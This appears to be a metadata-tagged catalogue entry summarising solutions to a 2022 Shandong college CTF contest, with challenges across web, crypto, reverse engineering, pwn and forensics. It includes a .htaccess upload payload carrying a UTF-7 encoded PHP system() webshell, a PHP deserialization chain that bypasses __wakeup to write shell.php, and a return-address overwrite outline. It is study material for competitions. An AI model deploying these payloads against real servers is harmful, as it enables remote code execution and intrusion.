---
title: 第六届山东省大学生电子设计大赛——网络安全技能竞赛
contest: 山东省大学生电子设计大赛
year: 2022
difficulty: medium
vuln_type: web_unknown
tags: [Web-upload,.htaccess,UTF-7编码,加换行绕关键字,反序列化,成员数绕__wakeup,MT19937,mt_recover,DSA,AntSword流量,RGB转二维码,ezxor,arbitrary]
attack_chain: upload_100: 仅能上传.htaccess→开头#define width 1337+height 1337设文件大小→<Files ~ "^.ht"> Require all granted+SetHandler application/x-httpd-php→UTF-7编码+ADw?+AD0-system...绕<?=过滤+加换行绕关键字|pop_200: PHP5反序列化,File_operations/Show_index/Transfer/Exception_process链,str_replace('O:1:"A":2','O:1:"A":3')绕__wakeup成员数+写webshell|签到: 维吉尼亚→凯撒|三层base|mt: 32位素数flag+init(s)用1812433253 XOR+enc(y)四步XOR+逆recover+rrecover推回flag|easy: DSA r1=r2先求k再求flag|draw: 255/0 RGB转01串+PIL画400x400二维码|hacker: HTTP流找蚁剑流量+第147流zip+解压|ezxor: 输入38个a动态调试+随机数异或+与y异或|arbitrary: read(14)泄高codebase+read(15)低+write(-0x2)修改返回地址
key_payload: #define width 1337 + SetHandler application/x-httpd-php + UTF-7+ADw?+AD0-system|class Show_index->filepage(new Transfer)->method(new Transfer)->method(new File_operations)|for i in range(2^32, 2^31, -1): if gmpy2.is_prime(i): sstate = init(i); cc = enc(sstate[-1]); if cc == 1047573452: print(i)|h1,h2,s1,s2,r1,q → k = (h1*r2 - h2*r1) * invert(s1*r2 - s2*r1, q) % q, flag = (k*s1 - h1) * invert(r1, q) % q|read(14)+read(15) → codebase2*0x100000000+codebase-0xb17, write(-0x2, (codebase+0xa46)&0xffffffff)
one_liner: 第六届山东省赛网安赛题合集(Web upload_100+pop_200+Crypto签到/Vigenere/凯撒/三层base/MT19937/DSA+Re ezxor+arbitrary+Misc draw+二维码+hacker蚁剑流量)
lesson: 1) .htaccess解析PHP:SetHandler application/x-httpd-php+UTF-7编码(+ADw?+AD0-system)+加换行绕关键字(如Fi+换行+les); 2) PHP5反序列化__wakeup成员数绕:str_replace('O:1:"A":2','O:1:"A":3'); 3) MT19937 32位素数init+enc:recover(inverse_right/left_mask逆4步)+rrecover(逆init推回s[0]); 4) DSA r1=r2已知:先求k=(h1*r2-h2*r1)*invert(s1*r2-s2*r1,q)%q再求flag; 5) 蚁剑流量第147流含zip,需hex提取; 6) 24-bit RGB转01:255=1/0=0; 7) arbitrary:read 14+15拼codebase,write(-0x2)修改返回地址为codebase+0xa46
quality: high
---

## 备注

原文(https://www.ctfiot.com/87624.html)第六届山东省大学生电子设计大赛(网安社三队第1/3/7名)合集。

### 题目详情

**Web-upload_100** — .htaccess解析PHP
```apache
#define width 1337
#define height 1337
<Files ~ "^.ht">
  Require all granted
  Order allow,deny
  Allow from all
</Files>
SetHandler application/x-httpd-php
php_flag zend.multibyte 1
php_value zend.script_encoding "UTF-7"
# +ADw?+AD0-system(+ACQAXw-POST+AFs-whoami+AF0)+ADs?+AD4
```

**Web-pop_200** — PHP5反序列化
- class File_operations {protected $filename='/var/www/html/shell.php';}
- class Show_index {public $filepage;}
- class Exception_process {public $arg;}
- class Transfer {public $method; private $parameter="...";}
- poc链: Show_index->filepage(Transfer)->method(Transfer)->method(File_operations)
- str_replace('O:1:"A":2','O:1:"A":3')绕__wakeup成员数

**Crypto-签到/凯撒/三层base**
- 维吉尼亚→凯撒位移
- 三层base64嵌套

**Crypto-mt** — MT19937
```python
# init(flag) s[i] = 0xFFFFFFFF & (1812433253 * (s[i-1] ^ s[i-1] >> 30) + i)
# enc(y) y^=y>>11; y^=y<<7 & 2636928640; y^=y<<15 & 4022730752; y^=y>>18
# c = enc(state[-1]) = 1047573452
# 逆:recover(c)=inverse_right/left_mask; rrecover(last)=((last-i)*inv)%n
# flag = md5(str(flag))
```

**Crypto-easy** — DSA r1=r2
- `k = (h1*r2 - h2*r1) * invert(s1*r2 - s2*r1, q) % q`
- `flag = (k*s1 - h1) * invert(r1, q) % q`
- flag = md5(str(flag_long))

**Misc-hacker** — 蚁剑流量
- HTTP流找蚁剑流量
- 第147流含zip,hex提取
- 解压得flag

**Misc-draw** — RGB转01画二维码
- 255=1, 0=0
- PIL画400x400像素

**Re-ezxor**
- 输入38个a动态调试
- 与随机数异或得x
- flag = chr(x[i] ^ y[i] ^ ord('a'))

**Pwn-arbitrary**
- read(14)+read(15)拼codebase=codebase2*0x100000000+codebase-0xb17
- write(-0x2, (codebase+0xa46)&0xffffffff)改返回地址

## 评级

- **quality: high** — 8+题完整exp,Web反序列化+MT19937+DSA r1=r2+蚁剑流量+任意地址写,典型多方向合集
- **vuln_type: web_unknown** — 主分类Web
- 实战价值:.htaccess+UTF-7+加换行+MT19937逆推+DSA r1=r2是CTF高阶套路
